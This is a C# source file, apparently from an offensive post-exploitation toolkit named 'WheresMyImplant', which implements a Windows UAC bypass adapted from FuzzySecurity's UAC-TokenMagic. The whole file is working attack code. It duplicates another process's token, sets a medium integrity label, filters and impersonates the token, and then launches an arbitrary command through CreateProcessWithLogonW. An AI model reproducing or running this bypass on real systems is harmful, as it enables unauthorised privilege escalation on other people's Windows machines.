using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

namespace WheresMyImplant
{
    class RestrictedToken : Tokens
    {

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        public void BypassUAC(Int32 processId, String command)
        {
            GetPrimaryToken((UInt32)processId);
            SetTokenInformation();
            ImpersonateUser();
            CreateProcessWithLogonW(phNewToken, command, "");
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public void GetPrimaryToken(UInt32 processId)
        {
            //Originally Set to true
            IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }

            if (Unmanaged.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
            {
            }
            Unmanaged.CloseHandle(hProcess);

            if (!Unmanaged.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)(Constants.TOKEN_ALL_ACCESS),
                        IntPtr.Zero,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
            }
            else
            {
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public void SetTokenInformation()
        {
            Structs.SidIdentifierAuthority pIdentifierAuthority = new Structs.SidIdentifierAuthority();
            pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
            byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (Unmanaged.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
            }

            Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;

            Structs.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Structs.TOKEN_MANDATORY_LABEL();
            tokenMandatoryLabel.Label = sidAndAttributes;
            Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);
            
            if (Unmanaged.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
            {
            }
            else
            {
                GetError("NtSetInformationToken: ");
            }

            IntPtr luaToken = new IntPtr();
            if (Unmanaged.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
            {
            }
            else
            {
                GetError("NtFilterToken: ");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser()
        {
            IntPtr luaToken = new IntPtr();
            UInt32 flags = 4;
            Unmanaged.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);

            if (!Unmanaged.DuplicateTokenEx(
                        phNewToken,
                        (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                        IntPtr.Zero,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out luaToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }
    }
}
